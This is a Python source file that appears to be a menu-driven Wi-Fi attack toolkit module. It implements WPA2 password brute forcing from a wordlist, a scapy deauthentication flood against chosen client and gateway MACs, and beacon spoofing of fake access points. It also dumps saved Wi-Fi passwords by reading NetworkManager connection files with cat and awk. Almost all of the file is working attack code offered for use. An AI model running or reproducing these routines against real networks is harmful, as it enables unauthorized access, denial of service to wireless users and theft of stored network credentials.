##########################################3
from scapy.all import *
from threading import Thread
import pandas
import time
import os
import subprocess as sub
import sys
import pywifi
from pywifi import *
import logging 
import re 
import queue
import colored
from Modules import intro
from faker import Faker

logging.disable(logging.CRITICAL)
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
logging.getLogger('pywifi.runtime').setLevel(logging.ERROR)
angry1 = colored.fg("green") + colored.attr("bold")
angry = colored.fg("red") + colored.attr("bold")
angry2 = colored.fg("white") + colored.attr("bold")
q = queue.Queue()

class Wifi() :
    def __init__(self):
        
        print("""
        1 - Scan Wifi Card 
        2 - Brute Force Wifi 
        3 - Deauth Attack Wifi
        4 - View Password Wifi 
        5 - Fake Wifi  
        6 - Detect Hidden Wifi
        99 - Back
        """)

        Number = input("[?]>")

        def Hidden_Wifi(pkt):
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                if not hiddenWIFI.has_key(pkt[Dot11].addr3):
                    ssid = pkt[Dot11Elt].info
                    bssid = pkt[Dot11].addr3
                    channel = int( ord(pkt[Dot11Elt:3].info))
                    capability = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}\{Dot11ProbeResp:%Dot11ProbeResp.cap%}") 
                    if re.search("privacy", capability): 
                        encrypted = 'Y'
                    else :
                        encrypted = 'N'
                        hiddenWIFI[pkt[Dot11].addr3] =[encrypted, ssid, bssid, channel]
                        print (hiddenWIFI)

 
        def Wifi_Broute_Force () :  
            try :
                while True:
                    global q
                    profile = pywifi.Profile()
                    profile.ssid = name_Wifi

                    password = q.get()

                    profile.auth = const.AUTH_ALG_OPEN
                    profile.akm.append(const.AKM_TYPE_WPA2PSK)
                    profile.cipher = const.CIPHER_TYPE_CCMP
                    profile.key = password
                    tmp_profile = inter_face.add_network_profile(profile)
                    time.sleep(2) 
                    inter_face.connect(tmp_profile)
                    time.sleep(4)
                    if inter_face.status() == const.IFACE_CONNECTED:

                        print(f"{angry1}[[[*]]] Crack Password is {password}{angry2}")
                        open("wifi_password.txt",'a').write(f"Crack Password is {password}")
                        with q.mutex:

                            q.queue.clear()
                            q.all_tasks_done.notify_all()
                            q.unfinished_tasks = 0                                
                    else :

                        print(f"{angry}[[[*]]] No Password {password}:{name_Wifi}")
            except :
                pass
            finally:

                q.task_done()
                    


                    
        
                

        def deauth(target_mac, gateway_mac, count=None, inter=0.1, loop=1, iface="wlan0mon",verbose=1):
            if verbose:
                if count:
                    print(f"{angry1}[+] Sending {count} frames every {inter}s...")
                else:
                    print(f"{angry1}[+] Sending frames every {inter}s for ever...")
                      
            dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
            packet = RadioTap()/dot11/Dot11Deauth(reason=7)
            sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)
            
            if count == 0:
                loop = 1
                count = None
            else:
                loop = 0
            
            
        def WifiFake(ssid, mac, infinite=True):
            dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
            beacon = Dot11Beacon(cap="ESS+privacy")
            essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
            frame = RadioTap()/dot11/beacon/essid   
            __loop = 1 
            try : 
                while __loop :
                    sendp(frame, inter=0.1, loop=1, iface=iface)
            except KeyboardInterrupt:
                __loop = 0
                pass
        def scan_wifi():

                
            
            networks = pandas.DataFrame(columns=["Name_SSID", "BSSID", "dBm_Signal", "Channel", "Crypto"]) # Data Frames 
            networks.set_index("Name_SSID", inplace=True) # index SSID Name Wifi exambles : Zain..
            try : 
                chack_Wifi = sub.getoutput(["iwconfig"])
                global find_card
                find_card = re.findall("wl\w+",str(chack_Wifi))[0]
                print(find_card)
                try :
                    print("[[#]] Start Mode:Monitor")  
                    sub.call(["ifconfig",find_card,"down"])
                    sub.call(["iwconfig",find_card,"mode","Monitor"])
                    sub.call(["ifconfig",find_card,"up"])
                except KeyboardInterrupt :
                    print("[[#]] Start Mode:Manged")  
                    sub.call(["ifconfig",find_card,"down"])
                    sub.call(["iwconfig",find_card,"mode","Manged"])
                    sub.call(["ifconfig",find_card,"up"])
            except :
                find_card = str(input("WifiCard #>  "))
            def callback(packet):
                if packet.haslayer(Dot11Beacon):
                    # extract the MAC address of the network
                    ssid = packet[Dot11Elt].info.decode()

                    bssid = packet[Dot11].addr2
                    # get the name of it
                    try:
                        dbm_signal = packet.dBm_AntSignal
                    except:
                        dbm_signal = "N/A"
                    # extract network stats
                    stats = packet[Dot11Beacon].network_stats()
                    # get the channel of the AP
                    channel = stats.get("channel")
                    # get the crypto
                    crypto = stats.get("crypto")
                    networks.loc[ssid] = (bssid, dbm_signal, channel, crypto)


            def print_all():
                while True:
                    os.system("clear")
                    print(networks)
                    time.sleep(0.5)


            def change_channel(): 
                ch = 1
                while True:
                    os.system(f"iwconfig {find_card} channel {ch}")
                    # switch channel from 1 to 14 each 0.5s
                    ch = ch % 14 + 1
                    time.sleep(0.5)
       



            
            printer = Thread(target=print_all)
            printer.daemon = True
            printer.start()
            channel_changer = Thread(target=change_channel)
            channel_changer.daemon = True
            channel_changer.start()
           

                # start sniffing Scan Wifi Card
             
            snif = sniff(prn=callback, iface=find_card)           
            networks.to_html("Wifi.html")


        def View_Wifi ():
            print("""
            1 - Linux 
            """)
            Number_H = int(input("[?]>>"))
            if Number_H == 1 or "linux" or "Linux ":
                view = sub.getoutput(["cat   /etc/NetworkManager/system-connections/* | awk -F '='  '/ssid/{print $2}/psk=/{print $2}'"])
                open("linux.txt",'a').write(view)
                for i in view.splitlines():
                    print('\t\t'+colored.fg("green")+i+angry2)
            else : 
                pass
                

        
        if Number == str(1) or "use scan wifi" in Number :
            scan_wifi()           
        elif Number == str(2) or "use brute" in Number:
            wifi = pywifi.PyWiFi()
            inter_face = wifi.interfaces()[0]
             
            name_Wifi = str(input("[#] SSID_Name :  "))
            pass_file = str(input("[#] List_Password :  "))
            theard = int(input("Theread:"))
            pass_file = open(pass_file).read().split("\n")

            for password in pass_file:
                q.put(password)
            for t in range(theard):
                thread = Thread(target=Wifi_Broute_Force)
                thread.daemon = True
                thread.start()
            q.join()




        elif Number == str(3) or "use deauth" in Number :
            target = str(input("[?] Target Mac  :"))
            gateway = str(input("[?] Gateway Mac :"))
            count = int(input("[?] Count :"))
            iface = str(input("[?] Interface :"))
            deauth(target, gateway, count,iface=iface,verbose=1) 
        elif Number == str(4) :
            View_Wifi()
        elif  Number == str(5):
            print("""
            1- Single Fake 
            2- Group Fake 
            """)
            numper = int(input("[?]>>"))
            if numper == 1 :
                sender_mac = RandMAC()
                iface = str(input("Interface:"))
                sender_mac = RandMAC()
                ssid = str(input("Name Wifi:"))
                dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_mac, addr3=sender_mac)
                beacon = Dot11Beacon()
                essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
                frame = RadioTap()/dot11/beacon/essid
                __loop = 1
                try :

                    while __loop :
                        sendp(frame, inter=0.1, iface=iface, loop=1)
                except KeyboardInterrupt :
                    __loop = 0
            elif numper == 2 :

                try:

                    n_ap = int(input("AP Numper :"))
                    iface = str(input("InterFace :"))
                    faker = Faker()
                    ssids_macs = [ (faker.name(), faker.mac_address()) for i in range(n_ap) ]
                    for ssid, mac in ssids_macs:

                        Thread(target=WifiFake, args=(ssid, mac)).start()
                except :
                    pass
        elif Number == str(6):
            hiddenWIFI = dict()
            InterFace = str(input("InterFace :"))
            __loop = 1 
            try :

                while True :
                    sniff(iface=InterFace, prn=Hidden_Wifi, count=10, timeout=3, store=0)
            except :
                pass
            
        elif Number == str(99) or "back" in Number :
            intro.main()




            

